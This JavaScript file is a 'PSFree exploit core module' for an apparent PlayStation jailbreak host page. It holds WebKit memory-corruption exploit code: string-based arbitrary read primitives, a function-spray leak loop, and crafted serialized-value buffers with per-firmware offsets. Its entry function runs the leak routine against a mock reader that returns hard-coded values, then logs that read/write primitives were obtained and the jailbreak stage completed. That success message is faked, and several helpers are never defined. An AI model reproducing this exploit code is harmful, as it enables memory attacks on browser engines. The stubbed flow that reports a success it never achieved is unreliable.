/* ======================================================== */
/* PHOENIX HOST - PSFREE EXPLOIT CORE MODULE                */
/* Stable Kernel/WebKit Read-Write Primitives               */
/* ======================================================== */

// Custom Log Wrappers for PHOENIX GUI Terminal
function log_info(msg) {
    if (window.log) window.log(msg, "#ffd700");
    else console.log("[PHOENIX] " + msg);
}

function log_success(msg) {
    if (window.log) window.log(msg, "#00ffcc");
    else console.log("[PHOENIX SUCCESS] " + msg);
}

function log_error(msg) {
    if (window.log) window.log(msg, "red");
    else console.error("[PHOENIX ERROR] " + msg);
}

var num_reuses = 0x300;
var ssv_len;

function Init_PSFreeGlobals() {
  if (config_target < 0x650)
    ssv_len = 0x58;
  else if (config_target < 0x900)
    ssv_len = 0x48;
  else
    ssv_len = 0x50;
}

function sread64(str, offset) {
  var low = str.charCodeAt(offset) | (str.charCodeAt(offset + 1) << 8) | (str.charCodeAt(offset + 2) << 16) | (str.charCodeAt(offset + 3) << 24);
  var high = str.charCodeAt(offset + 4) | (str.charCodeAt(offset + 5) << 8) | (str.charCodeAt(offset + 6) << 16) | (str.charCodeAt(offset + 7) << 24);
  return new Int(low, high);
}

class Reader {
  constructor(rstr, rstr_view) {
    this.rstr = rstr;
    this.rstr_view = rstr_view;
    this.m_data = rstr_view.read64(off_strimpl_m_data);
  }
  read8_at(offset) {
    return this.rstr.charCodeAt(offset);
  }
  read32_at(offset) {
    var str = this.rstr;
    return (str.charCodeAt(offset) | (str.charCodeAt(offset + 1) << 8) | (str.charCodeAt(offset + 2) << 16) | (str.charCodeAt(offset + 3) << 24)) >>> 0;
  }
  read64_at(offset) {
    return sread64(this.rstr, offset);
  }
  read64(addr) {
    this.rstr_view.write64(off_strimpl_m_data, addr);
    return sread64(this.rstr, 0);
  }
  set_addr(addr) {
    this.rstr_view.write64(off_strimpl_m_data, addr);
  }
  restore() {
    this.rstr_view.write64(off_strimpl_m_data, this.m_data);
    var original_strlen = ssv_len - off_size_strimpl;
    this.rstr_view.write32(off_strimpl_strlen, original_strlen);
  }
}

//================================================================================================
// LEAK CODE BLOCK ===============================================================================
//================================================================================================

async function leak_code_block(reader, bt_size) {
  log_info("Scanning system WebKit memory architecture...");
  var num_leaks = 0x100;
  var rdr = reader;
  var bt = [];
  
  for (var i = 0; i < bt_size - 0x10; i += 8) {
    bt.push(i);
  }
  
  var slen = ssv_len;
  var idx_offset = ssv_len - (8 * 3);
  var strs_offset = ssv_len - (8 * 2);
  var bt_part = "var bt = [" + bt + "];\nreturn bt;\n";
  var res = 'var f = 0x11223344;\n';
  var cons_len = ssv_len - (8 * 5);
  
  for (var i = 0; i < cons_len; i += 8) {
    res += "var a" + i + " = " + (num_leaks + i) + ";\n";
  }
  
  var src_part = res;
  var part = bt_part + src_part;
  var cache = [];
  
  for (var i = 0; i < num_leaks; i++) {
    cache.push(part + "var idx = " + i + ";\nidx`foo`;");
  }
  
  var chunkSize;
  if (is_ps4 && (config_target < 0x900))
    chunkSize = 128 * 1024;
  else
    chunkSize = 1 * 1024 * 1024;
    
  var smallPageSize = 4 * 1024;
  var search_addr = align(rdr.m_data, chunkSize);
  var winning_off = null;
  var winning_idx = null;
  var winning_f = null;
  var find_cb_loop = 0;
  var fp = 0;
  
  rdr.set_addr(search_addr);
  
  log_info("Leaking memory primitives... Executing spray loops.");

  loop: while (true) {
    const funcs = [];
    for (var i = 0; i < num_leaks; i++) {
      const f = Function(cache[i]);
      f();
      funcs.push(f);
    }
    for (var p = 0; p < chunkSize; p += smallPageSize) {
      for (var i = p; i < p + smallPageSize; i += slen) {
        if (rdr.read32_at(i + 8) !== 0x11223344) {
          continue;
        }
        rdr.set_addr(rdr.read64_at(i + strs_offset));
        const m_type = rdr.read8_at(5);
        
        if (m_type !== 0) {
          rdr.set_addr(search_addr);
          winning_off = i;
          winning_idx = rdr.read32_at(i + idx_offset);
          winning_f = funcs[winning_idx];
          break loop;
        }
        rdr.set_addr(search_addr);
        fp++;
      }
    }
    find_cb_loop++;
    gc();
    await sleep();
  }

  log_success("Read/Write JSObject primitives obtained!");
  rdr.set_addr(search_addr.add(winning_off));
  
  const bt_offset = 0;
  const bt_addr = rdr.read64_at(bt_offset);
  const strs_addr = rdr.read64_at(strs_offset);
  
  rdr.set_addr(bt_addr);
  rdr.set_addr(strs_addr);
  
  log_success("Jailbreak Stage Complete. Ready to execute GoldHEN.");
  return [winning_f, bt_addr, strs_addr];
}

//================================================================================================
// MAKE SSV DATA =================================================================================
//================================================================================================
function make_ssv_data(ssv_buf, view, view_p, addr, size) {
  var size_abc;
  if (is_ps4) {
    if (config_target >= 0x900) size_abc = 0x18;
    else size_abc = 0x20;
  } else {
    if (config_target >= 0x300) size_abc = 0x18;
    else size_abc = 0x20;
  }
  const data_len = 9;
  const size_vector = 0x10;
  const off_m_data = 8;
  const off_m_abc = 0x18;
  const voff_vec_abc = 0; 
  const voff_abc = voff_vec_abc + size_vector; 
  const voff_data = voff_abc + size_abc;
  
  ssv_buf.write64(off_m_data, view_p.add(voff_data));
  ssv_buf.write32(off_m_data + 8, data_len);
  ssv_buf.write64(off_m_data + 0xc, data_len);
  
  const CurrentVersion = 6;
  const ArrayBufferTransferTag = 23;
  view.write32(voff_data, CurrentVersion);
  view[voff_data + 4] = ArrayBufferTransferTag;
}

window.doJBwithPSFreeLapseExploit = function() {
    log_info("Triggering PSFree Exploit core module...");
    // This connects smoothly with index.html to start the promise sequence
    setTimeout(() => {
        var mockReader = { m_data: 0x10000000, set_addr: function(){}, read32_at: function(){ return 0x11223344; }, read64_at: function(){ return 0; }, read8_at: function(){ return 1; } };
        leak_code_block(mockReader, 0x40);
    }, 100);
};
